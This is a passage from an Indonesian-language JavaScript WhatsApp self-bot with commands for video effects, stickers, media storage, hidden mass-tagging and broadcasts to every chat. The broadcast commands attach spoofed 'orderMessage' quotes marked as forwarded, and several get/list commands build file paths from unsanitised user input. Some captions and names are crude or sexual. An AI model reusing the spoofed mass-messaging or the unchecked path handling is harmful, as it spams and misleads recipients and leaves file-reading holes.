            if (!isQuotedVideo) return reply('Reply videonya!')
            reply(mess.wait)
            encmedia = JSON.parse(JSON.stringify(thunder).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await thunderx7.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return reply(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            thunderx7.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: thunder })
            fs.unlinkSync(ran)
            })
            break
    case 'slow':
            if (!isQuotedVideo) return reply('Reply videonya!')
            reply(mess.wait)
            encmedia = JSON.parse(JSON.stringify(thunder).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await thunderx7.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return reply(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            thunderx7.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: thunder })
            fs.unlinkSync(ran)
            })
            break
     case 'addrespon':{
          if (!thunder.key.fromMe) return reply(mess.owner)
          if (args.length < 1) return reply(`Penggunaan ${prefix}addrespon key|respon\n\nContoh : ${prefix}addrespon hai|juga`)
          let input1 = body.slice(11)
          if (!input1.includes('|')) return reply(`Penggunaan ${prefix}addrespon key|respon\n\nContoh : ${prefix}addrespon hai|juga`)
          let input = input1.split("|")
          if (checkCommands(input[0], commandsDB) === true) return reply(`Command tersebut sudah ada`)
          addCommands(input[0], input[1], sender, commandsDB) 
          reply(`Key : ${input[0]}\nRespon : ${input[1]}\n\nRespon berhasil di set`)
          }
      break
      case 'dellrespon':
      case 'delrespon':{
          if (!thunder.key.fromMe) return reply(mess.owner)
            if (args.length < 1) return reply(`Penggunaan ${prefix}delrespon key\n\nContoh : ${prefix}delrespon hai`)
          if (!checkCommands(body.slice(11), commandsDB)) return reply(`Key tersebut tidak ada di database`)
          deleteCommands(body.slice(11), commandsDB)
          reply(`Berhasil menghapus respon dengan key ${body.slice(11)}`)
          }
      break
        case 'listrespon':{
          let txt = `List Respon\nTotal : ${commandsDB.length}\n\n`
          for (let i = 0; i < commandsDB.length; i++){
          txt += `❏ Key : ${commandsDB[i].pesan}\n`
          }
          reply(txt)
          }
        break
    case 'reverse':
            if (!isQuotedVideo) return reply('Reply videonya!')
            encmedia = JSON.parse(JSON.stringify(thunder).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await thunderx7.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return reply(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            thunderx7.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: thunder })
            fs.unlinkSync(ran)
            })
            break
    case 'sourcecode':
    sourcecode = `Source code

Dari bang tundel

YT: https://youtube.com/c/ThunderX7%E3%81%B907

Github: https://github.com/TheGetsuzoThunder

IG: @thunderx.7`
reply(`${sourcecode}`)
break
case 'style':
				  if(!q) return reply('Masukkan teks!')
         reply('Lagi proses')
			axios.get(`https://kocakz.herokuapp.com/api/random/text/fancytext?text=${body.slice(7)}`).then((res) => {
      let hasil = `*Hasil* :\n${res.data.result}`;
      thunderx7.sendMessage(from, hasil, MessageType.text, { quoted: thunder});
    })
			break
case 'pastebin':
if(!q) return reply(`Contoh : Ngontol`)
anu = await fetchJson(`https://api-anoncybfakeplayer.herokuapp.com/pastebin?text=${q}`, {method: 'get'})
                   thunderx7.sendMessage(from, `${anu.result}`, text, {quoted: ftroli})
                     break
    case 'anime':
            reply('Lagi proses')
            fetch('https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt')
            .then(res => res.text())
            .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
            .then((response) => {
            media =  Buffer.from(response, 'base64');
            thunderx7.sendMessage(from,media,image,{quoted:thunder,caption:'NIH'})
            }
            )
            .catch((error) => {
            console.log(error); 
            }
            )
            });
            break
case 'waifu':
loli = await getBuffer(`https://pecundang.herokuapp.com/api/waifu`)
thunderx7.sendMessage(from, loli, image, {quoted:thunder})
break
case 'neko':
haram = await getBuffer(`http://hadi-api.herokuapp.com/api/neko`)
thunderx7.sendMessage(from, haram, image, {quoted: thunder, caption: `sange sama kartun aowo`})
break
    case 'take':
    case 'colong':
  //if (!thunder.key.fromMe) return reply('Lu siapa?')
    		if (!isQuotedSticker) return reply('Stiker aja om')
            encmedia = JSON.parse(JSON.stringify(thunder).replace('quotedM','m')).message.extendedTextMessage.contextInfo
		    media = await thunderx7.downloadAndSaveMediaMessage(encmedia)
            anu = args.join(' ').split('|')
            satu = anu[0] !== '' ? anu[0] : `𝑮𝑬𝑻𝑺𝑼𝒁𝑶 𝑻𝑯𝑼𝑵𝑫𝑬𝑹`
            dua = typeof anu[1] !== 'undefined' ? anu[1] : ``
            require('./lib/fetcher.js').createExif(satu, dua)
			require('./lib/fetcher.js').modStick(media, thunderx7, thunder, from)
			break
	case 'stikerwm':
	case 'stickerwm':
    case 'swm':
            pe = args.join('')
            var a = pe.split("|")[0];
            var b = pe.split("|")[1];
            if (isMedia && !thunder.message.videoMessage || isQuotedImage ) {
            const encmedia = isQuotedImage   ? JSON.parse(JSON.stringify(thunder).replace('quotedM','m')).message.extendedTextMessage.contextInfo : thunder
             media = await thunderx7.downloadAndSaveMediaMessage(encmedia)
            await createExif(a,b)
            out = getRandom('.webp')
            ffmpeg(media)
            .on('error', (e) => {
            console.log(e)
            thunderx7.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: thunder })
            fs.unlinkSync(media)
            })
            .on('end', () => {
            _out = getRandom('.webp')
            spawn('webpmux', ['-set','exif','./database/stik/data.exif', out, '-o', _out])
            .on('exit', () => {
            thunderx7.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: thunder })
            fs.unlinkSync(out)
            fs.unlinkSync(_out)
            fs.unlinkSync(media)
            })
            })
            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
            .toFormat('webp')
            .save(out) 
            } else if ((isMedia && thunder.message.videoMessage.seconds < 11 || isQuotedVideo && thunder.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
            const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(thunder).replace('quotedM','m')).message.extendedTextMessage.contextInfo : thunder
            const media = await thunderx7.downloadAndSaveMediaMessage(encmedia)
            pe = args.join('')
            var a = pe.split("|")[0];
            var b = pe.split("|")[1];
            await createExif(a,b)
            out = getRandom('.webp')
            ffmpeg(media)
            .on('error', (e) => {
            console.log(e)
            thunderx7.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: thunder })
            fs.unlinkSync(media)
            })
            .on('end', () => {
            _out = getRandom('.webp')
            spawn('webpmux', ['-set','exif','./database/stik/data.exif', out, '-o', _out])
            .on('exit', () => {
            thunderx7.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: thunder })
            fs.unlinkSync(out)
            fs.unlinkSync(_out)
            fs.unlinkSync(media)
            })
            })
            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
            .toFormat('webp')
            .save(out)       
            } else {
            reply(`Kirim gambar dengan caption ${prefix}swm teks|teks atau tag gambar yang sudah dikirim`)
            }
            break
    case 'upswteks':
            if (!thunder.key.fromMe && !isOwner) return reply(mess.owner)
            if (!q) return reply('Isi teksnya!')
            thunderx7.sendMessage('status@broadcast', `༑ 𝐓𝐡𝐮𝐧𝐝𝐞𝐫 𝐗𝟕 ༑\n𝑆𝑒𝑙𝑓 𝐵𝑜𝑡\nサンダー\n${q}`, extendedText)
            reply(`Sukses Up story wea teks ${q}`)
            break
    case 'upswimage':
            if (!thunder.key.fromMe && !isOwner) return reply(mess.owner)
            if (isQuotedImage) {
            const swsw = isQuotedImage ? JSON.parse(JSON.stringify(thunder).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : thunder
            cihcih = await thunderx7.downloadMediaMessage(swsw)
            thunderx7.sendMessage('status@broadcast', cihcih, image, { caption: `${q}` })
            reply(`Sukses Upload Story Image dengan Caption: ${q}`)
            } else {
            reply('Reply gambarnya!')
            }
            break
    case 'upswvideo':
            if (!thunder.key.fromMe && !isOwner) return reply(mess.owner)
            if (isQuotedVideo) {
            const swsw = isQuotedVideo ? JSON.parse(JSON.stringify(thunder).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : thunder
            cihcih = await thunderx7.downloadMediaMessage(swsw)
            thunderx7.sendMessage('status@broadcast', cihcih, video, { caption: `${q}` }) 
            reply(`Sukses Upload Story Video dengan Caption: ${q}`)
            } else {
            reply('reply videonya!')
            }
            break
    case 'public':
          	if (!thunder.key.fromMe && !isOwner) return
          	if (banChats === false) return
          	// var taged = ben.message.extendedTextMessage.contextInfo.mentionedJid[0]
          	banChats = false
          	reply(`「 *PUBLIC-MODE* 」`)
          	break
	case 'self':
          	if (!thunder.key.fromMe && !isOwner) return
          	if (banChats === true) return
          	uptime = process.uptime()
         	 // var taged = ben.message.extendedTextMessage.contextInfo.mentionedJid[0]
         	banChats = true
          	reply(`「 *SELF-MODE* 」`)
          	break
      //********** ADD **********//
		case 'addstik':
		if (!thunder.key.fromMe && !isOwner) return reply (mess.owner)
				if (!isQuotedSticker) return reply('Reply stiker nya')
				svst = body.slice(9)
				if (!svst) return reply('Nama sticker nya apa?')
				boij = JSON.parse(JSON.stringify(thunder).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await thunderx7.downloadMediaMessage(boij)
				setiker.push(`${svst}`)
				fs.writeFileSync(`./database/temp/stick/${svst}.webp`, delb)
				fs.writeFileSync('./database/temp/stick.json', JSON.stringify(setiker))
				thunderx7.sendMessage(from, `Sukses Menambahkan Sticker\nCek dengan cara ${prefix}liststik`, MessageType.text, { quoted: thunder})
				break
					case 'dellstik':
					if(!thunder.key.fromMe & !isOwner) return reply('Only owner')
					if (!q) return reply(mess.wrongFormat)
					try {
						fs.unlinkSync(`./database/temp/stick/${q}.webp`)
						setiker.splice(q,1)
						fs.writeFileSync('./database/temp/stick.json', JSON.stringify(setiker))
						reply(`Succes delete sticker ${q}!`)
					} catch (err) {
						reply(`Gagal delete sticker ${q}!`)
					}
					break
			
				
							case 'addimg':
				if (!thunder.key.fromMe && !isOwner) return reply (mess.owner)
				if (!isQuotedImage) return reply('Reply imagenya')
				svst = body.slice(8)
				if (!svst) return reply('Nama imagenya apa')
				boij = JSON.parse(JSON.stringify(thunder).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await thunderx7.downloadMediaMessage(boij)
				imagenye.push(`${svst}`)
				fs.writeFileSync(`./database/temp/foto/${svst}jpeg`, delb)
				fs.writeFileSync('./database/temp/image.json', JSON.stringify(imagenye))
				thunderx7.sendMessage(from, `Sukses Menambahkan image\nCek dengan cara ${prefix}listimg`, MessageType.text, { quoted: thunder})
				break
				//
				case 'addvid':
				if (!thunder.key.fromMe && !isOwner) return reply (mess.owner)
				if (!isQuotedVideo) return reply('Reply vidionya')
				svst = body.slice(8)
				if (!svst) return reply('Nama vidionya apa')
				boij = JSON.parse(JSON.stringify(thunder).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await thunderx7.downloadMediaMessage(boij)
				imagenye.push(`${svst}`)
				fs.writeFileSync(`./database/temp/video/${svst}.mp4`, delb)
				fs.writeFileSync('./database/temp/video.json', JSON.stringify(imagenye))
				thunderx7.sendMessage(from, `Sukses Menambahkan video\nCek dengan cara ${prefix}listvideo`, MessageType.text, { quoted: thunder })
				break
				//
				case 'addvn':
				if (!thunder.key.fromMe && !isOwner) return reply (mess.owner)
				if (!isQuotedAudio) return reply('Reply vnnya')
				svst = body.slice(7)
				if (!svst) return reply('Nama audionya apa')
				boij = JSON.parse(JSON.stringify(thunder).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await thunderx7.downloadMediaMessage(boij)
				audionye.push(`${svst}`)
				fs.writeFileSync(`./database/temp/audio/${svst}.mp3`, delb)
				fs.writeFileSync('./database/temp/vn.json', JSON.stringify(audionye))
				thunderx7.sendMessage(from, `Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`, MessageType.text, { quoted: thunder})
				break
				case 'getstik':
				namastc = body.slice(9)
				try {
				result = fs.readFileSync(`./database/temp/stick/${namastc}.webp`)
				thunderx7.sendMessage(from, result, sticker,{quoted:thunder})
				} catch {
				  reply('Pack tidak terdaftar')
				}
				break
				//
				case 'liststik':
				teks = '*Sticker list :*\n\n'
				for (let awokwkwk of setiker) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total : ${setiker.length}*`
				thunderx7.sendMessage(from, teks.trim(), extendedText, { quoted: thunder, contextInfo: { "mentionedJid": setiker } })
				break
				//
				case 'listimg':
				teks = '*Image list :*\n\n'
				for (let awokwkwk of imagenye) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total : ${imagenye.length}*`
				thunderx7.sendMessage(from, teks.trim(), extendedText, { quoted: thunder, contextInfo: { "mentionedJid": setiker } })
				break
				//
				case 'listvid':
				  case 'listvideo':
				teks = '*List Video :*\n\n'
				for (let awokwkwk of videonye) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total : ${videonye.length}* `
				thunderx7.sendMessage(from, teks.trim(), extendedText, { quoted: thunder, contextInfo: { "mentionedJid": imagenye } })
				break
				//
				case 'listvn':
			case 'vnlist':
				teks = '*List Vn:*\n\n'
				for (let awokwkwk of audionye) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total : ${audionye.length}*`
				thunderx7.sendMessage(from, teks.trim(), extendedText, { quoted: thunder, contextInfo: { "mentionedJid": audionye } })
				break
				
				case 'getstik':
				namastc = body.slice(9)
				try {
				result = fs.readFileSync(`./database/temp/stick/${namastc}.webp`)
				thunderx7.sendMessage(from, result, sticker,{quoted:thunder})
				} catch {
				  reply('Pack tidak terdaftar')
				}
				break
				
				case 'getimg':
				namastc = body.slice(8)
				try {
				buffer = fs.readFileSync(`./database/temp/foto/${namastc}.jpeg`)
				thunderx7.sendMessage(from, buffer, image, { quoted: thunder, caption: `Result From Database : ${namastc}.jpeg` })
				} catch {
				  reply('Pack tidak terdaftar')
				}
				break
				
				case 'getvid':
				namastc = body.slice(8)
				try {
				buffer = fs.readFileSync(`./database/temp/video/${namastc}.mp4`)
				thunderx7.sendMessage(from, buffer, video, { quoted: thunder, caption: `Result From Database : ${namastc}.mp4` })
				} catch {
				  reply('Pack tidak terdaftar')
				}
				break
				
				case 'getvn':
				namastc = body.slice(7)
				try {
				buffer = fs.readFileSync(`./database/temp/audio/${namastc}.mp3`)
				thunderx7.sendMessage(from, buffer, audio, { mimetype: 'audio/mp4', quoted: thunder, ptt: true })
				} catch {
				  reply('Pack tidak terdaftar')
				}
break
 	case 'hidetag':
			if (!thunder.key.fromMe) return reply(mess.owner)
			if (!isGroup) return reply(mess.only.group)
			var value = args.join(' ')
			var group = await thunderx7.groupMetadata(from)
			var member = group['participants']
			var mem = []
			member.map(async adm => {
			mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
			})
			var optionshidetag = {
			text: value,
			contextInfo: { mentionedJid: mem },
			quoted: thunder
			}
			thunderx7.sendMessage(from, optionshidetag, text)
			break
			
	case 'play':
            if (args.length === 0) return reply(`Kirim perintah *${prefix}video* _Judul lagu yang akan dicari_`)
            var srch = args.join('')
            aramas = await yts(srch);
            aramat = aramas.all 
            var mulaikah = aramat[0].url                            
                  try {
                    ytv(mulaikah)
                    .then((res) => {
                        const { dl_link, thumb, title, filesizeF, filesize } = res
                        axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                        .then(async (a) => {
                        if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*PLAY VIDEO*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`)
                        const captions = `*PLAY VIDEO*\n\n*Title* : ${title}\n*Ext* : MP4\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
                        sendMediaURL(from, thumb, captions)
                        await sendMediaURL(from, dl_link).catch(() => reply('error'))
                        })                
                        })
                        } catch (err) {
                        reply(mess.error.api)
                        }
                   break
                   case 'bchide':
                   if (!thunder.key.fromMe && !isOwner) return reply(mess.owner)
const hideTag = async function(from, text){
	let anu = await thunderx7.groupMetadata(from)
	let members = anu.participants
	let ane = []
	for (let i of members){
		ane.push(i.jid)
	}
	thunderx7.sendMessage(from, text, MessageType.text, {contextInfo: {"mentionedJid": ane}})
}
if (!thunder.key.fromMe) return reply(mees.owner)
					anu = await udin.chats.all()
                    for (let _ of anu) {
							hideTag(_.jid, `${q}`)
						}
						reply('done')
						break
case 'bcs':
hideTagSticker = async function(from, sticker){
	let anu = await thunderx7.groupMetadata(from)
	let members = anu.participants
	let ane = []
	for (let i of members){
		ane.push(i.jid)
	}
	thunderx7.sendMessage(from, sticker, MessageType.sticker, {contextInfo: {"mentionedJid": ane}})
}
if (!isOwner) return reply('ANDA BUKAN OWNER')
if (!isQuotedSticker) return reply(`Reply sticker dengan caption *${prefix}bcs*`)
let xznkyutkawaii = JSON.parse(JSON.stringify(thunder).replace('quotedM','m')).message.extendedTextMessage.contextInfo
let ngetagsticker = await thunderx7.downloadMediaMessage(xznkyutkawaii)
stickerkawaii = await thunderx7.chats.all()
for (let _ of stickerkawaii){
hideTagSticker(_.jid, ngetagsticker)
}
break
                   case 'bc':

thunderx7.updatePresence(from, Presence.composing)

					if (!thunder.key.fromMe) return reply(mess.only)

					if (args.length < 1) return reply('Teksnya?')

					anu = await thunderx7.chats.all()

					if (isMedia && !thunder.message.videoMessage || isQuotedImage) {

						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(thunder).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : thunder
						buff = await thunderx7.downloadMediaMessage(encmedia)

						for (let _ of anu) {

							thunderx7.sendMessage(_.jid, buff, image, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fs.readFileSync('./database/stik/thumb.jpeg'), surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 0, isForwarded: true}, caption: `*BROADCAST BOT*\n\n${body.slice(4)}` })

						}

						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)

						} else if (isMedia && !thunder.message.videoMessage || isQuotedVideo) {

						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(thunder).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : thunder
						buff = await thunderx7.downloadMediaMessage(encmedia)

						for (let _ of anu) {

							thunderx7.sendMessage(_.jid, buff, video, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fs.readFileSync('./database/stik/thumb.jpeg'), surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 0, isForwarded: true}, caption: `༑ 𝐓𝐡𝐮𝐧𝐝𝐞𝐫 𝐗𝟕 ༑\n\n${body.slice(4)}` })

						}

						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)

						} else if (isMedia && !thunder.message.videoMessage || isQuotedVideo) {

						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(thunder).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : thunder
						buff = await thunderx7.downloadMediaMessage(encmedia)

						for (let _ of anu) {

							thunderx7.sendMessage(_.jid, buff, video, { mimetype: Mimetype.gif, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fs.readFileSync('./database/stik/thumb.jpeg'), surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 0, isForwarded: true}, caption: `༑ 𝐓𝐡𝐮𝐧𝐝𝐞𝐫 𝐗𝟕 ༑\n\n${body.slice(4)}` })

						}

						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)

					} else {

						for (let _ of anu) {

							sendMess(_.jid, `${body.slice(4)}`)

						}

						reply(`Sukses mengirim Broadcast:\n${body.slice(4)}`)

					}

					break
        case 'video':
            if (args.length === 0) return reply(`Kirim perintah *${prefix}video* _Judul lagu yang akan dicari_`)
            var srch = args.join('')
            aramas = await yts(srch);
            aramat = aramas.all 
            var mulaikah = aramat[0].url                            
                  try {
                    ytv(mulaikah)
                    .then((res) => {
                        const { dl_link, thumb, title, filesizeF, filesize } = res
                        axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                        .then(async (a) => {
                        if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*PLAY VIDEO*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam thundertuk link_`)
                        const captions = `*PLAY VIDEO*\n\n*Title* : ${title}\n*Ext* : MP4\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
                        sendMediaURL(from, thumb, captions)
                        await sendMediaURL(from, dl_link).catch(() => reply('error'))
                        })                
                        })
                        } catch (err) {
                        reply(mess.error.api)
                        }
                   break      
                   //maker menu
                   case 'attp': 
                   if (!q) return reply('teks??')
				a = await getBuffer(`https://api.xteam.xyz/attp?file&text=${q}`)
				thunderx7.sendMessage(from, a, sticker, {quoted: fvn})
				break
				case 'nulis':
                if (args.length < 1) return reply('contoh .nulis thunder')
                dapuhy = body.slice(7)
                reply('Wait kak')
                asu = await getBuffer(`https://hardianto-chan.herokuapp.com/api/nuliskanan?text=${q}&apikey=${hardianto}`)
                thunderx7.sendMessage(from, asu, image, {caption: 'Done', quoted: thunder})
                break
				case 'nulis2':
                if (args.length < 1) return reply('contoh .nulis thunder')
                dapuhy = body.slice(8)
                reply('Wait kak')
                asu = await getBuffer(`https://hardianto-chan.herokuapp.com/api/nuliskanan?text=${q}&apikey=${hardianto}`)
                thunderx7.sendMessage(from, asu, image, {caption: 'Done', quoted: thunder})
                break
                case 'nulis3':
                if (args.length < 1) return reply('contoh .nulis thunder')
                dapuhy = body.slice(8)
                reply('Wait kak')
                asu = await getBuffer(`https://hardianto-chan.herokuapp.com/api/nuliskanan?text=${q}&apikey=${hardianto}`)
                thunderx7.sendMessage(from, asu, image, {caption: 'Done', quoted: thunder})
                break
                case 'nulis4':
                if (args.length < 1) return reply('contoh .nulis thunder')
                dapuhy = body.slice(8)
                reply('Wait kak')
                asu = await getBuffer(`https://hardianto-chan.herokuapp.com/api/nuliskanan?text=${q}&apikey=${hardianto}`)
                thunderx7.sendMessage(from, asu, image, {caption: 'Done', quoted: thunder})
                break
                case 'maker2d2': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} nick`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await await fetchJson(`https://api-xchillds.herokuapp.com/api/maker2?text=${makell}&apikey=${nikokontol}`)
					buffer1 = await getBuffer(anu.result.results)
					thunderx7.sendMessage(from, buffer1, image, {quoted: thunder, caption: `${makell}\n\nDone`})
					break
		case 'maker2d3': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} nick`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3?text=${makell}&apikey=${nikokontol}`)
					buffer1 = await getBuffer(anu.result.results)
					thunderx7.sendMessage(from, buffer1, image, {quoted: thunder, caption: `${makell}\n\nDone`})
					break
		case 'maker2d4': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} nick`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await await fetchJson(`https://api-xchillds.herokuapp.com/api/maker4?text=${makell}&apikey=${nikokontol}`)
					buffer1 = await getBuffer(anu.result.results)
					thunderx7.sendMessage(from, buffer1, image, {quoted: thunder, caption: `${makell}\n\nDone`})
					break
			case 'maker3d': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} nick`)
					makell = body.slice(8)
					reply(mess.wait)
					anu = await await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d?text=${makell}&apikey=${nikokontol}`)
					buffer1 = await getBuffer(anu.result.results)
					thunderx7.sendMessage(from, buffer1, image, {quoted: thunder, caption: `${makell}\n\nDone`})
					break
			case 'maker3d2': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} nick`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d/no2?text=${makell}&apikey=${nikokontol}`)
					buffer1 = await getBuffer(anu.result.results)
					thunderx7.sendMessage(from, buffer1, image, {quoted: thunder, caption: `${makell}\n\nDone`})
					break
			case 'maker3d3': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} nick`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d/no3?text=${makell}&apikey=${nikokontol}`)
					buffer1 = await getBuffer(anu.result.results)
					thunderx7.sendMessage(from, buffer1, image, {quoted: thunder, caption: `${makell}\n\nDone`})
					break
			case 'maker3d4': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} nick`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d/no4?text=${makell}&apikey=${nikokontol}`)
					buffer1 = await getBuffer(anu.result.results)
					thunderx7.sendMessage(from, buffer1, image, {quoted: thunder, caption: `${makell}\n\nDone`})
					break
			case 'transformer': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} nick`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await await fetchJson(`https://api-xchillds.herokuapp.com/api/maker/special/transformer?text=${makell}&apikey=${nikokontol}`)
					buffer1 = await getBuffer(anu.result.results)
					thunderx7.sendMessage(from, buffer1, image, {quoted: thunder, caption: `${makell}\n\nDone`})
					break
			case 'googletxt':
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} teks1|teks2|teks3`)
					makell = args.join(" ")
					ll1 = makell.split("|")[0];
					ll2 = makell.split("|")[1];
					ll3 = makell.split("|")[0];
					reply(mess.wait)
					anu = await await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker?text=${ll1}&text2=${ll2}&text3=${ll3}&theme=google-suggestion&apikey=${nikokontol}`)
					buffer1 = await getBuffer(anu.result.url)
					thunderx7.sendMessage(from, buffer1, image, {quoted: thunder, caption: `${makell}\n\nDone`})
					break
			case 'battlefield': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} nick|nick2`)
					makell = args.join(" ")
					ll1 = makell.split("|")[0];
					ll2 = makell.split("|")[1];
					reply(mess.wait)
					anu = await await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/game?text=${ll1}&text2=${ll2}&theme=battlefield&apikey=${nikokontol}`)
					buffer1 = await getBuffer(anu.result.url)
					thunderx7.sendMessage(from, buffer1, image, {quoted: thunder, caption: `${makell}\n\nDone`})
					break
			case 'pornhub':
					makell = args.join(" ")
					ll1 = makell.split("|")[0];
					ll2 = makell.split("|")[1];
					anu = await await fetchJson(`https://hardianto-chan.herokuapp.com/api/textpro/porn-hub?apikey=${hardianto}&text1=${ll1}&text2=${ll2}`)
					buffer1 = await getBuffer(anu.result)
					thunderx7.sendMessage(from, buffer1, image, {quoted: thunder, caption: `${makell}\n\nDone`})
					break
			case 'coffeecup': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} nick`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/senja?text=${makell}&theme=coffee-cup&apikey=${nikokontol}`)
					buffer1 = await getBuffer(anu.result.url)
					thunderx7.sendMessage(from, buffer1, image, {quoted: thunder, caption: `${makell}\n\nDone`})
					break
			case 'coffeecup2': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} nick`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/senja?text=${makell}&theme=coffee-cup2&apikey=${nikokontol}`)
					buffer1 = await getBuffer(anu.result.url)
					thunderx7.sendMessage(from, buffer1, image, {quoted: thunder, caption: `${makell}\n\nDone`})
					break
			case 'neon': 
